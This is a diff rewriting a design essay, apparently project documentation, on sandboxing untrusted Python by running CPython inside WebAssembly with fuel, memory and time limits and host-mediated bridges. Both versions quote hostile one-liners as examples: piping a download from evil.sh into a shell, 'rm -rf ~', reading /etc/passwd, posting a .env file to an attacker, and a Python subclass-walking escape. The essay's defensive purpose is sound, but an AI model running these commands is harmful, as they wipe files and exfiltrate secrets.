@@ -4,193 +4,227 @@
 
 # Running Code You Don't Trust
 
-> How the gateway executes arbitrary Python from an AI agent — or a curious twelve-year-old — without ever putting the host at risk. A story about sandboxing, told through the one decision that makes the rest of it safe: a blast radius of zero, by construction.
+> How to run code written by a stranger, a student, or an AI without betting your machine on it. The whole trick is one inversion: don't try to lock dangerous code down. Start it with nothing, then hand back only what you choose.
 
-There is a moment, in every system that lets something *else* write the code, where you have to answer an uncomfortable question. An agent has reasoned its way to a tool. The tool is not a fixed function you wrote and reviewed — it is Python, authored on the fly, by a model, against your database, in your process, on your machine. You are about to call `exec` on a string you have never seen.
+Sooner or later every product grows a feature that runs someone else's code. The **Run** button under a tutorial. A spreadsheet formula. A plugin marketplace. An AI assistant that asks, "want me to run that for you?" They all make the same bet: *take code we didn't write, and execute it on our hardware.*
 
-**What happens if that string is hostile? What happens if it's just wrong?**
-
-Most systems answer this question with a prayer and a code review. This one answers it with a wall.
+You would never double-click a `.py` file a stranger emailed you. Your software does the moral equivalent thousands of times a day. This is how to make that genuinely safe — not safe-ish, not safe-until-someone-clever-shows-up. Safe.
 
 ---
 
-## Chapter I — The Pain
+## Start with the pain, because it's expensive
 
-### every easy way to run untrusted code is a way to lose your machine
+Say you run a site that teaches Python, and you add a Run button. Within the hour, someone types this into it:
 
-Say you want to let a tool be *code* — not a rigid endpoint, but a few lines of Python that filter a result, reshape a document, call a sibling tool, hit an API. The flexibility is the entire point. It is also the entire problem, because the menu of ways to actually run that code is a menu of ways to get hurt.
-
-**Run it in-process.** Fastest, simplest, catastrophic. `exec()` in your own interpreter hands the author your file system, your environment variables, your network, your secrets, and your database connection — all of it, ambiently, the instant the code runs. One `import os; os.system("rm -rf ~")`, one `open("/etc/passwd")`, one `requests.post(attacker, env=os.environ)` and the game is over. There is no boundary here. There is only trust, and you've extended it to a string.
-
-**Sprinkle in a blocklist.** Strip `__builtins__`, ban `import`, regex out the scary words. This is security theater, and the people who break it do it for sport. Python's introspection is a hall of mirrors — `().__class__.__bases__[0].__subclasses__()` walks you back to anything you "removed," and every patched hole grows three more. A denylist is a promise that you've thought of every attack. You haven't.
-
-**Reach for `os.fork` + `seccomp` + namespaces.** Now you're writing a container runtime by hand, per platform, and getting it subtly wrong in ways you'll discover in production. It doesn't run on a laptop the same as it runs on Linux. It leaks file descriptors. The syscall filter is either so tight nothing works or so loose nothing's protected.
-
-**Spin up a real VM or container per call.** Correct, and far too heavy. Hundreds of milliseconds to seconds of cold start, a daemon to babysit, an image to maintain, an attack surface the size of an entire kernel. You'll do it for some workloads. You will not do it for a tool call that's supposed to feel instant.
-
-Every one of these fails the same test. The default is *allow* — the code starts with access to everything, and you spend your effort frantically taking capabilities away, hoping you got them all. That is exactly backwards. And it's why the honest version of "let the agent run code" usually becomes "don't," and the flexibility dies in a review meeting.
-
-The pain isn't that running untrusted code is hard. It's that the easy ways are unsafe and the safe ways are unusable.
-
----
-
-## Chapter II — The Hypothesis
-
-### what if the code started with nothing, and the blast radius were zero by construction?
-
-Flip the polarity. Instead of a powerful runtime you frantically lock down, start from a runtime that can do *nothing at all* — and then hand back, one capability at a time, only the exact doors you choose to open.
-
-State it as a wager:
-
-> If untrusted code runs inside a memory-isolated machine that has **no syscalls, no file system, no network, no clock, no environment, and no host memory** unless a capability is explicitly granted, then a malicious author and a buggy author become the *same* problem — neither can reach anything you didn't hand them — and "safe" stops being a checklist you maintain and becomes a property of the boundary itself.
-
-The shift is from **permissions** to **capabilities**. A permission system says "you may do X" and trusts the runtime to enforce it against code actively trying to lie about who it is. A capability system says "you physically do not hold a reference to X, so the question of permission never arises." You can't misuse a key you were never given. You can't escape a room with no doors.
-
-This is not a new idea — it's the oldest good idea in security, *deny by default*, taken literally instead of aspirationally. The hypothesis is that a runtime exists which makes it cheap: starts in milliseconds, runs ordinary Python, isolates memory like a VM, and grants capabilities like a careful host instead of an all-or-nothing OS.
-
-That runtime is WebAssembly.
-
----
-
-## Chapter III — The Solution
-
-### CPython, compiled to WebAssembly, run inside a jail that grants nothing it isn't told to
-
-The gateway runs every code-backed tool as **CPython compiled to WebAssembly (WASI)**, executed inside the [`wasmtime`](https://wasmtime.dev) engine. The author writes normal Python. It runs in a real interpreter. But that interpreter lives inside a WebAssembly module, and a WebAssembly module is the rarest thing in computing: a program that genuinely begins with *nothing*.
-
-A `.wasm` module has its own linear memory — a flat array of bytes it cannot grow past its limit and cannot point *outside of*. There is no instruction in WebAssembly to read host memory, call a syscall, open a socket, or touch a file. The only way a guest can affect the outside world is to call a function the host *imported into it by name*. Import nothing, and the guest is a pure, sealed calculator. That's the floor we build up from — not a powerful thing we cut down.
-
-Here's the heart of it, the few lines where the jail is actually constructed. First the meters — a CPU budget, a memory ceiling, and a wall-clock deadline:
-
-```688:691:services/sandbox_worker.py
-    store = Store(engine)
-    store.set_fuel(int(limits["fuel"]))
-    store.set_limits(memory_size=int(limits["memory_bytes"]))
-    store.set_epoch_deadline(1)
+```python
+import os
+os.system("curl https://evil.sh | sh")
 ```
 
-Then the capability set — which is almost entirely about what it leaves out:
+If you ran that the obvious way, the lesson is over and so is your week. Here's the part worth internalizing: **the snippet didn't have to be clever.** Plain `exec(user_code)` hands a stranger everything the host process can touch — files, environment variables, saved credentials, the network, any database connection you left open — instantly and ambiently. Three one-liners and you're done:
 
-```718:729:services/sandbox_worker.py
-    wasi = WasiConfig()
-    wasi.argv = [
-        "python",
-        "-c",
-        _bootstrap_program(),
-        "/job/job.json",
-        "/job/sandbox.result.json",
-    ]
-    wasi.stdout_file = str(stdout_file)
-    wasi.stderr_file = str(stderr_file)
-    wasi.preopen_dir(str(job_dir), "/job")
-    store.set_wasi(wasi)
+```python
+os.system("rm -rf ~")                              # the files
+open("/etc/passwd").read()                         # the secrets
+requests.post(attacker, data=open(".env").read())  # the keys
 ```
 
-Read what that `WasiConfig` does *not* say. It does not open the network — there is no socket capability, so `import socket` inside the guest reaches a dead end. It does not expose the host file system — the guest sees exactly one directory, the per-call scratch dir mapped to `/job`, and nothing above it; there is no `/`, no `/etc`, no home directory, no path traversal target because there is no parent to traverse to. It does not forward your environment — the author's `os.environ` is whatever the job explicitly placed there, never the host's secrets. The guest gets a clock and a temp directory. That's the whole world.
+Put concrete numbers on it, because this is the cost a decision has to weigh:
 
-Everything else in this document is defense in depth layered *on top of* a runtime that was already incapable of hurting you.
+- **Time to total compromise:** milliseconds. There is no review step, no second chance, no undo.
+- **Blast radius:** the entire account the process runs as. Not the snippet's data — *everything* the host can reach.
+- **Cost of being wrong once:** a leaked credential, a wiped disk, a pivot into your network. One bad run, not a thousand.
+
+And here's the kicker that kills most teams' enthusiasm: the *malicious* user and the *confused beginner who pasted a Stack Overflow answer they didn't understand* are the same incident. You're not just defending against attackers. You're defending against honest mistakes that happen to be destructive.
+
+So the real question isn't "is this risky?" It's "what would actually make it not risky?" Before reaching for a tool, it's worth being honest about why the popular answers don't clear the bar.
 
 ---
 
-## Chapter IV — The Layers
+## The alternatives, and why each one loses
 
-### fuel, epochs, memory, and the only three doors out
+Everyone tries these in roughly this order. Each fails for a reason worth naming, because the failures define what a real solution has to do.
 
-A sealed calculator that runs forever or eats all your RAM is still a denial-of-service. WebAssembly's gift is that compute and memory are *meterable* at the instruction level, so the limits are exact, not best-effort.
+**1. Just run it.** Covered above. The default is *unlimited trust*. Non-starter.
 
-**Fuel — the CPU budget.** wasmtime can charge the guest one unit of "fuel" per WebAssembly instruction and trap the instant it runs dry. A `while True: pass` doesn't hang the host; it burns its allotment and dies with a clean `fuel_exhausted`. The default budget is generous enough for real work (`sandbox_fuel`, four billion instructions) and finite enough that infinite is impossible.
+**2. Block the dangerous stuff.** Strip `__builtins__`, ban the word `import`, regex out `os`, `eval`, `open`. This *feels* like security and is the opposite, because Python hands the attacker a ladder back to everything you "removed":
 
-**Epochs — the wall clock.** Fuel bounds *work*; an epoch deadline bounds *time*. A background timer increments an epoch counter and the guest is interrupted when the wall deadline passes — so even code that blocks rather than spins still gets cut off. Crucially, the timer is **paused** while the host services a legitimate request on the guest's behalf, so waiting on a database round-trip is never charged as the author's compute time.
-
-**Memory — the ceiling.** `store.set_limits(memory_size=...)` caps the guest's linear memory (`sandbox_memory_bytes`, 256 MiB by default). An allocation past the cap fails inside the guest as a normal `MemoryError`; it cannot reach out and pressure the host's memory, because it has no host memory to reach.
-
-**Output — the bound on what comes back.** A guest can't flood you with a terabyte of result, either: stdout, stderr, and the returned value are each truncated to a hard budget (`sandbox_max_output_bytes`), and an oversized result is replaced with a small, fail-closed `output_limit` error rather than forcing the host to buffer an unbounded line.
-
-And then the part that makes the sandbox *useful* instead of merely safe: **the doors.** A jail that can do nothing is secure and boring. The interesting question is how you grant exactly three powers — talk to the database, call a sibling tool, make an HTTP request — without surrendering the isolation that made the jail worth building.
-
-The answer is that the guest never gets the capability. It gets a *request slip*. When tool code calls `context.db.users.find_one(...)` or `context.http.get(url)`, nothing happens inside the sandbox except a small JSON message written to a file in `/job/rpc`. The **host** — trusted code, outside the wall — picks up that message, and *it* decides:
-
-- The **DB bridge** re-checks the caller's tenant and read/write scope on every single operation, caps documents and result bytes, and limits how many calls one invocation may make. The guest never holds a database connection; it holds the right to *ask* the host to run a bounded query.
-- The **tool bridge** re-authorizes a cross-tool call against the *original* caller and runs the sibling in its own fresh sandbox, with a depth limit so a tool can't recurse the host to death.
-- The **HTTP bridge** screens every URL against an egress allowlist and an SSRF denylist, pins a validated IP, bounds request and response size, and trips a circuit breaker on repeated failure. The author writes `context.http.get(...)`; the author never gets a raw socket.
-
-All three bridges are **disabled by default** (`sandbox_db_bridge_enabled`, `sandbox_tool_bridge_enabled`, `sandbox_http_bridge_enabled` all start `False`). A fresh deployment runs code that can compute and return a value, and *nothing else*, until an operator deliberately opens a door — and even then, every door is a host-mediated, re-authorized, rate-limited request, not a handle.
-
-Two more layers sit underneath, for the failures you didn't plan for:
-
-**The supply chain is pinned.** The CPython runtime itself isn't whatever's lying around — it's a specific `python.wasm`, downloaded from a pinned URL and **rejected unless its SHA-256 matches** a hardcoded digest. You are not trusting a registry to still be honest tomorrow; you're trusting a hash.
-
-```48:60:scripts/fetch_python_wasm.py
-    expected = args.sha256.strip().lower()
-    if len(expected) != 64:
-        raise SystemExit("Expected a 64-char SHA256 digest for --sha256.")
-
-    destination = Path(args.output)
-    destination.parent.mkdir(parents=True, exist_ok=True)
-    payload = _download(args.url)
-    digest = _sha256_bytes(payload)
-    if digest != expected:
-        raise SystemExit(
-            f"Checksum mismatch for downloaded python.wasm: expected {expected}, got {digest}."
-        )
+```python
+# no import keyword, yet this reaches process spawners, file openers, the lot
+().__class__.__bases__[0].__subclasses__()
 ```
 
-Third-party packages get the same deny-by-default treatment: pip installs run on the host *outside* the wasm jail, are restricted to a per-tenant allowlist (empty means **nothing**), and are wheels-only — `--only-binary=:all:` — so no package's `setup.py` ever executes arbitrary build code on your host. Any code a wheel does carry runs later, *inside* the sandbox, where it's already powerless.
+A blocklist is a bet that you imagined every attack. You didn't, and the people probing it do this for fun. You will lose this race forever.
 
-**The worker is disposable, and starts clean every time.** Each call runs in a separate subprocess (the worker), inside a brand-new wasm `Store` and a fresh interpreter instance. The worker is launched with a scrubbed environment that contains import paths and locale and *not one caller secret*. If a job times out, crashes, or trips a protocol breach, the worker is killed and replaced — a poisoned worker can never serve the next caller. And as a last, belt-and-suspenders backstop beneath WebAssembly's own limits, the throwaway worker applies POSIX `rlimit` ceilings (CPU seconds, output file size, descriptor count) so that even a hypothetical escape from the wasm fuel/epoch limits still hits an operating-system wall.
+**3. Lock it down at the OS.** Fork a process, drop privileges, add a `seccomp` syscall filter, wrap it in namespaces. Now you're hand-rolling a container runtime, per platform, and getting it subtly wrong where you can't see it. The Linux kernel exposes **300+ syscalls** across tens of millions of lines of C — that's your attack surface, and you're defending it by hand. Tight enough to be safe usually means too tight to be useful.
 
-Count the walls between hostile code and your machine: the WebAssembly memory boundary, the empty WASI capability set, the fuel meter, the epoch timer, the memory cap, the output bound, the default-off and host-re-authorized bridges, the checksum-pinned runtime, the allowlisted wheels-only installer, the secret-free disposable subprocess, and the OS-level rlimits under all of it. To do real harm, code would have to defeat *all* of them. To do nothing harmful, it just has to be ordinary Python — which is exactly what we wanted to run in the first place.
+**4. Give every run its own VM or container.** Finally correct — and too heavy for the job. Real isolation, but you pay for it: container and microVM cold starts run from **~100ms to multiple seconds**, plus a whole guest OS to patch, an image to maintain, and a daemon to babysit. Fine for a nightly batch job. Nobody ships that behind a Run button meant to feel instant for a snippet that executes in 40ms.
 
----
+Lay them side by side and the pattern is obvious:
 
-## Chapter V — The Playground
+| Approach | Isolated by default? | Real language? | Startup | Maintenance burden |
+|---|---|---|---|---|
+| `exec()` | No — total trust | Yes | ~0ms | None (and no safety) |
+| Blocklist | No — leaks endlessly | Yes | ~0ms | Infinite cat-and-mouse |
+| seccomp / namespaces | Partly | Yes | low | High, per-platform, fragile |
+| VM / container per run | Yes | Yes | 100ms–seconds | Heavy (OS, images, daemon) |
+| **What we want** | **Yes** | **Yes** | **~1ms** | **Low** |
 
-### a real database, real tools, real HTTP — and a delete key that can't reach your laptop
+Every viable option except the last shares one disease: **it starts the code with full power and scrambles to take it back.** The default is *allow*, and your job becomes an endless game of subtraction where forgetting one item loses the game.
 
-Now turn the whole thing around and look at it from the other side, because the same property that makes this safe for an *AI agent* makes it the best learning environment a beginner has ever had.
-
-Think about how a kid or a junior developer actually learns to code today. The good stuff — touching a real database, calling a real API, watching a query you wrote return rows you didn't expect — lives behind a wall of fear. *Don't run that, you'll drop the table. Don't paste that, it might be malware. Don't experiment on prod. Set up a local environment first* — and three days later they're still fighting a Python version mismatch instead of learning anything. The toy sandboxes that are safe (a fake console, a frozen tutorial) aren't real, and the real systems aren't safe. Beginners are stuck choosing between consequence-free pretend and consequence-everywhere reality.
-
-This sandbox dissolves that choice. It is **real on the inside and sealed on the outside**, which is precisely the environment you'd design for someone learning if you could.
-
-A learner gets to write *actual* Python — real syntax, real exceptions, real tracebacks, the genuine article, not a watered-down classroom dialect. They get `context.db` and can run a real `find`, a real `aggregate`, a real `update_one`, and watch a real document come back. They get `context.http` and can call a weather API and parse a real JSON response. They get `context.tools` and can compose one tool out of another, which is *the* lesson most curricula never reach: software is made of other software.
-
-And here is what they cannot do, no matter how hard they try, on purpose or by accident:
-
-- They cannot `rm -rf` anything. There is no file system to delete.
-- They cannot leak a secret or an API key. The environment the guest sees never contained them.
-- They cannot melt the laptop with an infinite loop. Fuel runs out; the loop dies; the prompt comes back.
-- They cannot drop the production table. Every database call is re-checked against *their* scope by the host, and a read-only learner is read-only no matter what they type.
-- They cannot reach the internal network, scan a port, or get phished into pasting an exploit — the egress allowlist and SSRF denylist screen every outbound request, and there's no raw socket to abuse anyway.
-- They cannot poison the next person's session. Their worker is thrown away and the next call starts from a clean interpreter.
-
-That changes what experimentation *feels* like. The most valuable thing a beginner can do is the thing they're most afraid to do: **break things and read the error.** Run the query wrong. Hit the API the wrong way. Loop forever. Try the dangerous-looking thing just to see what happens. In this environment, the answer to "what happens?" is always a real, honest, educational result — a traceback, a timeout, a rejected scope, an `output_limit` — and *never* a destroyed machine, a leaked credential, or a 2 a.m. incident. The cost of curiosity drops to zero, and curiosity is the entire engine of learning to code.
-
-It's the difference between learning to drive in a parking lot at midnight and learning to drive in traffic. One is real but unforgiving; the other is forgiving but fake. The sandbox is the third option nobody usually gets: **real traffic, in a car that physically cannot crash into anything that matters.** A junior dev can spend an afternoon making every mistake in the book against a live-feeling system and walk away having learned from all of them, with nothing downstream the worse for it.
-
-The same wall that protects you from an adversarial AI is the wall that lets a fourteen-year-old run their first database query without anyone holding their breath.
+The fix is to stop subtracting.
 
 ---
 
-## Chapter VI — Honest Limits
+## What "good" actually has to mean
 
-### what the wall is, and what it isn't
+If you're going to choose a sandbox, these are the criteria that matter — the bar any honest solution has to clear:
 
-A security document that only lists strengths is marketing. So, plainly:
+1. **Isolated by default.** The code starts with no files, no network, no env, no host memory. You *add* powers; you never *remove* them.
+2. **Real language, real ergonomics.** People write normal code and get real tracebacks. Not a crippled DSL.
+3. **Fast enough to be invisible.** Single-digit milliseconds to start, so it works behind an interactive button.
+4. **Capabilities you grant by name.** Want it to read one folder or call one API? Hand over exactly that, nothing adjacent.
+5. **Hard resource limits.** CPU, memory, and wall-clock are capped, so "infinite loop" is a shrug, not an outage.
+6. **Low operational weight.** No fleet of VMs to patch.
 
-- **WebAssembly isolates the guest; it is not a substitute for the layers around it.** A bug in wasmtime, or in the bridge code that the host runs on the guest's behalf, is outside the guest's wall. That's exactly why the bridges re-authorize on the *host* and why the OS-level rlimits and disposable workers exist underneath — defense in depth assumes any single layer can fail.
-- **Side channels are not the threat model.** This sandbox stops a guest from reading host memory, files, secrets, and the network. It does not promise constant-time defense against exotic timing or microarchitectural side channels; if that's your threat model, a guest sharing a host is the wrong starting point.
-- **A granted door is a granted door.** If an operator enables the HTTP bridge and allowlists a host, code can reach that host within the configured bounds. The bridges shrink and police capability; they don't make a *granted* capability harmless. Grant deliberately.
-- **The runtime is a moving dependency.** The safety rests on the pinned `python.wasm` and on wasmtime; both must be kept current as fixes land. A pin is a promise that the artifact is the one you vetted — it is not a promise that the artifact is eternally flawless.
-
-None of this weakens the core claim. It sharpens it. The wall is strong precisely because it does not pretend to be the only wall.
+There's exactly one mainstream technology that hits all six. You've probably only seen it make games run in a browser tab.
 
 ---
 
-## The Thread
+## The idea: start from zero
 
-Untrusted code is unsafe because the usual runtimes start by granting everything and ask you to take it back. WebAssembly starts by granting nothing and asks you to hand back exactly the doors you choose. CPython compiled into that model gives you a real interpreter inside a sealed machine; fuel and epochs and a memory cap make "forever" and "all of it" impossible; host-mediated bridges turn three dangerous capabilities into three re-authorized requests; a checksum-pinned runtime and an allowlisted, wheels-only installer and a secret-free disposable worker close the supply chain and the blast radius behind it.
+Flip the polarity. Instead of a powerful runtime you frantically restrain, use a runtime that, the moment it boots, can do *nothing* — and then deliberately hand back the few abilities you actually want.
 
-The result is one property, stated two ways. For the machine handing code to an AI: *a hostile string and a buggy string are the same harmless problem.* For the human learning to write that string: *every mistake is real enough to teach you and contained enough to forgive you.*
+The technical name for the shift is **permissions → capabilities**, and the difference is the whole ballgame:
 
-A blast radius of zero, by construction — which is the only kind worth trusting, and the only kind safe enough to hand a beginner the keys.
+- A **permission** model says "you may not do X," then trusts a referee to enforce that against code actively lying about who it is.
+- A **capability** model says "you don't hold a reference to X, so the question never comes up."
+
+You can't misuse a key you were never handed. You can't escape a room with no doors. It's "deny by default" taken *literally* — not as a policy you maintain, but as a fact about the box.
+
+The only thing that ever made this impractical was performance: a box that truly starts empty was historically also slow and awkward. That's the part that changed.
+
+---
+
+## How it works: WebAssembly
+
+Run the untrusted code as **WebAssembly**.
+
+Here's the property people miss because they met WASM as a browser toy: a `.wasm` module genuinely starts with nothing. It has its own **linear memory** — one flat array of bytes it cannot grow past its limit or point *outside of*. There is no WebAssembly instruction to read host memory, open a file, make a network call, or invoke a syscall. Those powers aren't restricted; they're *absent from the instruction set*.
+
+So how does a module ever do anything useful? One way only: it calls a function the host **explicitly imported into it, by name.** Import nothing and you've got a sealed calculator — it can compute and hand back a result, and that's the entire extent of its reach into your world.
+
+And you don't need a new language to live there. Mature toolchains compile Python, JavaScript, Rust, Go, and C to WebAssembly — so you can drop a *real interpreter* inside the sealed box. The user writes ordinary code with real libraries and real stack traces. It just runs inside a machine that can't see your disk.
+
+Standing the box up looks like this — and the important part is everything it *doesn't* do:
+
+```python
+# Pseudocode for configuring a WebAssembly sandbox
+
+store = Store(engine)
+store.set_fuel(BUDGET)             # CPU: each instruction costs fuel
+store.set_memory_limit(256 * MB)   # RAM: a hard ceiling
+store.set_deadline(WALL_CLOCK)     # time: interrupt if it overruns
+
+caps = Capabilities()
+# caps.allow_network(...)   <- never called. there is no socket.
+# caps.preopen("/")         <- never called. there is no filesystem.
+# caps.inherit_env()        <- never called. os.environ is empty.
+caps.preopen(scratch_dir, as="/work")   # the ONE door you cut
+
+instantiate(store, module, caps).run()
+```
+
+Trace what that buys you. `import socket`? Dead end — no socket was granted. Read `/etc/passwd`? There is no `/etc`; the guest sees one scratch folder and nothing above it, so there's no path to traverse to. Steal env vars? `os.environ` is whatever you put there, never the host's. The guest gets one temp directory and the ability to think.
+
+Everything else is defense in depth stacked on a machine that already couldn't hurt you — which is a great place to build from, because every extra wall is a bonus rather than a load-bearing prayer.
+
+---
+
+## The guardrails: meters and request slips
+
+Two jobs remain. First, stop the box from running forever or eating all the RAM — not by asking nicely, but by making it impossible. WebAssembly meters compute and memory at the instruction level, so the limits are exact:
+
+- **Fuel** caps CPU: charge one unit per instruction, trap when it's gone. `while True: pass` spends its allowance and dies with a clean error instead of pinning a core.
+- **A deadline** caps time, so code that *blocks* instead of spinning still gets cut off.
+- **A memory ceiling** caps RAM: an over-budget allocation fails *inside* the guest as an ordinary `MemoryError`. It can't squeeze the host, because it has no host memory to reach.
+- **An output bound** caps what comes back, so nothing drowns you in a terabyte of result.
+
+Second — and this is the pattern to remember — give it the *useful* powers without giving up isolation. The move: **the guest never receives a capability. It receives the right to ask for one.**
+
+When code inside the box wants to read a record, nothing dangerous happens inside the box. It writes a small request — a *slip* — to its scratch dir: *"please run this query."* Your trusted code, **outside** the wall, picks up the slip and decides, every single time, whether to honor it. The guest holds no connection and no socket; it holds a polite request you can inspect, rewrite, rate-limit, or refuse.
+
+Three example doors, each adjudicated outside:
+
+- **Data.** "Read this record." Your code re-checks who the user is and what they're allowed to touch, on every call, and caps how many rows and bytes come back. The guest never holds the database.
+- **Other code.** "Call this other function." Your code re-authorizes against the *original* caller and runs the callee in its own fresh box, with a depth limit so nothing recurses you to death.
+- **Network.** "Fetch this URL." Your code checks it against an allowlist and an SSRF denylist, pins a validated address, and bounds the response. The author writes `http.get(url)` and never touches a raw socket.
+
+Every door is **shut by default.** A fresh box computes and returns a value and nothing else until you deliberately cut a specific door — and even then it's a supervised request, not a handle you tossed over the wall.
+
+Two more walls underneath, because good systems assume their own layers can fail:
+
+**Pin the runtime to a hash, not a hope.** The interpreter you run shouldn't be "whatever was lying around." Fetch a specific artifact and refuse to run it unless its hash matches a value you committed on purpose:
+
+```python
+blob = download(RUNTIME_URL)
+if sha256(blob) != EXPECTED_SHA256:
+    raise SystemExit("refusing to run an unverified runtime")
+```
+
+You're no longer trusting a download server to still be honest tomorrow — you're trusting a number. Treat third-party packages the same way: install only an explicit allowlist (empty means *nothing*), and prefer prebuilt artifacts so no package's install script runs build code on your trusted host. Anything a package carries only wakes up *inside* the box, where it's already powerless.
+
+**Make workers disposable.** Run each job in a throwaway process, fresh instance, environment scrubbed of secrets. If a run times out, crashes, or misbehaves, kill it and spawn a clean one — a poisoned worker can't serve the next person. And beneath WASM's own meters, add the OS's classic resource limits (CPU seconds, file size, open files) as a last backstop.
+
+Count the walls a hostile snippet has to beat, in order: the memory boundary, the empty capability set, fuel, the deadline, the memory cap, the output bound, the shut-by-default doors, the hashed runtime, the allowlisted installer, the disposable process, and the OS limits under all of it. To do harm it has to beat *every one*. To be useful it just has to be ordinary code. That asymmetry — trivial to use, near-impossible to abuse — is what a sandbox actually is.
+
+---
+
+## The payoff almost nobody is using yet
+
+Now flip the box around, because the exact property that makes it safe for a stranger's code makes it the best place to *learn* to code that has ever existed — and that use case is wide open.
+
+Think about how a kid or a brand-new junior dev learns today. The good stuff — touching a real database, calling a real API, seeing a query return something you didn't expect — sits behind a wall of fear. *Don't run that, you'll drop the table. Don't paste that, it might be malware. Don't touch prod. Set up a local environment first* — and three days later they're still fighting a broken virtualenv instead of learning anything. The safe environments are fake (a frozen tutorial, a console that only pretends). The real environments are dangerous. So beginners are stuck choosing between consequence-free pretend and consequence-everywhere reality.
+
+The box erases that choice: **real on the inside, sealed on the outside.** If you sat down to design the perfect place for a person to learn, this is what you'd draw.
+
+Inside, they write genuine code and get genuine tracebacks. Give them a data door and a real query returns a real record, shaped in a way that surprises them — and they learn from the surprise. Give them a network door and they call a live API. Here's what they *can't* do, no matter how hard they try, on a dare or by accident:
+
+- `rm -rf` anything — there's no filesystem to delete.
+- Leak an API key — the box never held one.
+- Melt the laptop with an infinite loop — fuel runs out, the loop dies, the prompt returns.
+- Drop the production table — every data request is re-checked outside, and a read-only learner stays read-only no matter what they type.
+- Get phished into pasting an exploit — outbound requests are screened, and there's no raw socket anyway.
+- Poison the next student's session — their worker is thrown away.
+
+That changes what experimenting *feels* like. The single most valuable thing a beginner can do is the thing they're trained to fear: **break it on purpose and read the error.** Run the query wrong. Hit the API wrong. Write the infinite loop just to see. In this box the answer to "what happens if…?" is always a real, honest, educational result — a traceback, a timeout, a polite refusal — and never a wiped machine or a 3 a.m. incident. The cost of curiosity drops to zero, and curiosity at zero cost is the entire engine of learning to build.
+
+The usual options are bad driving lessons: an empty parking lot at midnight (safe, but nothing real happens) or live rush-hour traffic (real, but unforgiving). The sandbox is the third one nobody gets to offer — **real traffic, in a car that physically can't crash into anything that matters.**
+
+---
+
+## What it doesn't solve
+
+Anything that only lists strengths is a sales brochure, so, plainly — and none of this retreats from the claim, it sharpens it:
+
+- **The box isolates the guest, not the code you wrote around it.** A bug in the WebAssembly engine, or in *your* code that services the request slips, lives outside the wall. That's exactly why the doors are adjudicated outside and why the OS limits and disposable workers sit underneath.
+- **Side channels aren't the threat model.** This stops a guest from reading your memory, files, secrets, and network. It doesn't promise defense against exotic timing or microarchitectural leaks. If that's your adversary, you want true hardware isolation.
+- **A door you opened is a door.** Allow the network and allowlist a host, and code can reach that host within your bounds. The doors shrink and supervise capability; they don't make a *granted* capability harmless. Open them on purpose.
+- **The runtime is a living dependency.** Safety leans on the engine and the pinned interpreter; keep both current. A hash pin means you're running the artifact you vetted — not that the artifact is flawless forever.
+
+The wall is strong precisely because it never pretends to be the only wall.
+
+---
+
+## Bottom line
+
+Untrusted code is dangerous because every easy way to run it starts by granting everything and begs you to claw it back. WebAssembly starts by granting *nothing* and lets you hand back, by name, only the doors you choose. Compile a real language into it and you get a real interpreter inside a sealed machine; meter the fuel, time, memory, and output and "forever" and "all of it" become impossible; turn every dangerous power into a request slip your code approves from outside the wall; pin the runtime to a hash, install only what you vetted, throw the worker away after each run, and put the OS's own limits underneath.
+
+What you're left with is one property that reads two ways depending on who's standing in front of the box.
+
+To the engineer feeding it a stranger's code: *the malicious snippet and the buggy snippet are the same harmless problem.*
+
+To the person learning to write that snippet: *every mistake is real enough to teach you and contained enough to forgive you.*
+
+A blast radius of zero, by construction. It's the only kind worth trusting with a stranger's code — and the only kind safe enough to hand a beginner the keys.
+
